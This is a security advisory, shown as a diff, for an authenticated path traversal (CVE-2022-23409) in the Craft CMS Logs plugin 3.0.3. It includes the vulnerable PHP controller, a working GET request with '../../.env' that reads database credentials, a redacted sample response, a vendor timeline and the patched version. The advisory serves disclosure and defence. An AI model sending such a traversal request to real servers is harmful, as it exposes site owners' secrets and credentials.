@@ -1,0 +1,118 @@
+id: 39638
+date: 06/02/2024
+title: Craft CMS Logs Plugin 3.0.3 - Path Traversal (Authenticated) Vulnerability
+author: ub3rsick
+cves: CVE-2022-23409
+
+# Exploit Title: Craft CMS Logs Plugin 3.0.3 - Path Traversal (Authenticated)
+# Exploit Author: Steffen Rogge
+# Vendor Homepage: https://github.com/ethercreative/logs
+# Software Link: https://plugins.craftcms.com/logs
+# Version: <=3.0.3
+# Tested on: Linux
+# CVE : CVE-2022-23409
+
+product: Ethercreative Logs plugin for Craft CMS
+fixed version: >=3.0.4
+impact: Medium
+found: 2021-07-06
+SEC Consult Vulnerability Lab
+An integrated part of SEC Consult, an Atos company
+Europe | Asia | North America
+https://www.sec-consult.com
+=======================================================================
+Vendor description:
+-------------------
+"A quick and dirty way to access your logs from inside the CP"
+As found on the plugin store page: https://plugins.craftcms.com/logs
+Active Installs 4,093 (as of 2021-07-07)
+Business recommendation:
+------------------------
+The vendor provides a patched version v3.0.4 which should be installed immediately.
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated Path Traversal (CVE-2022-23409)
+The plugin "Logs" provides a functionality to read log files of the Craft CMS system inside
+the backend of the CMS. As the requested logfile is not properly validated, an attacker is
+able to request arbitrary files from the underlying file system with the permissions of the
+web service user.
+Proof of concept:
+-----------------
+1) Authenticated Path Traversal (CVE-2022-23409)
+As the plugin is installed as an administrator of the system and the function is only accessible
+after being logged in as an admin, an attacker needs to be authenticated as an administrator in
+the backend in order to extract the needed "{MD5}_identity" cookie for the crafted request.
+The vulnerable endpoint is provided by the plugin under the following path:
+https://vulnerablesite.com/index.php/admin/actions/logs/logs/stream
+The vulnerable controller for that endpoint can be found here:
+https://github.com/ethercreative/logs/blob/master/src/Controller.php
+The function "actionStream()" provides an endpoint for the Craft CMS and does not validate input
+values before file content is being read by the function "file_get_contents".
+public function actionStream ()
+{
+$logsDir = \Craft::getAlias('@storage/logs');
+$logFile = \Craft::$app->request->getParam('log');
+$currentLog = \Craft::$app->request->get('log', $logFile);
+$log = file_get_contents($logsDir . '/' . $currentLog);
+exit($log);
+}
+A crafted GET parameter with the name "log" can be used to access files on the underlying filesystem
+with rights as the user executing the web server. In most cases this will be the user "www-data".
+In order to read the file ".env" or ".env.php" which contains the environment configuration and as
+such also the database credentials, the following request can be used:
+GET /admin/actions/logs/logs/stream?log=../../.env HTTP/1.1
+Host: <host>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
+Connection: close
+Cookie: 1031b8c41dfff97a311a7ac99863bdc5_identity=<identity_cookie>;
+The response then discloses the file content of the file ".env":
+HTTP/1.1 200 OK
+Date: Thu, 07 Jul 2021 10:08:52 GMT
+Server: nginx
+Content-Type: text/html; charset=UTF-8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: CraftSessionId=2uisculfj8t9q1tnbiukl6ogjf; path=/; secure; HttpOnly
+Content-Length: 1600
+Connection: close
+[...]
+$craftEnvVars = [
+'DB_DRIVER' => 'mysql',
+'DB_SERVER' => '********',
+'DB_USER' => '********',
+'DB_PASSWORD' => '********',
+'DB_DATABASE' => '********',
+'DB_SCHEMA' => 'public',
+'DB_TABLE_PREFIX' => '',
+'DB_PORT' => '********',
+'SECURITY_KEY' => '********',
+[...]
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested which was the latest version available at the time
+of the test:
+* Version 3.0.3 released on November 25, 2019
+Distributed through the Craft Plugin Store https://plugins.craftcms.com/logs
+Vendor contact timeline:
+------------------------
+2021-07-07: Contacting vendor through dev@ethercreative.co.uk
+2021-07-08: Response from vendor, no encryption available but vendor accepted to be responsible
+for any risks involved with plaintext communication
+2021-07-08: Advisory was sent to vendor unencrypted
+2021-07-09: Vendor released a patch for this vulnerability with version 3.0.4
+(https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4)
+2021-07-12: Updated Plugin has been tested on an up-to-date CraftCMS installation
+(CraftCMS 3.7.0, PHP 8, MySQL 8, Logs Plugin 3.0.4)
+2022-01-24: Release of security advisory
+Solution:
+---------
+The vendor released a patched version 3.0.4 or higher which can be retrieved from their
+website/github:
+https://plugins.craftcms.com/logs
+https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4
+Workaround:
+-----------
+Uninstall/Disable the plugin and access the Craft CMS logs via SSH or other services.
+
+#  0day.today [2024-06-04]  #
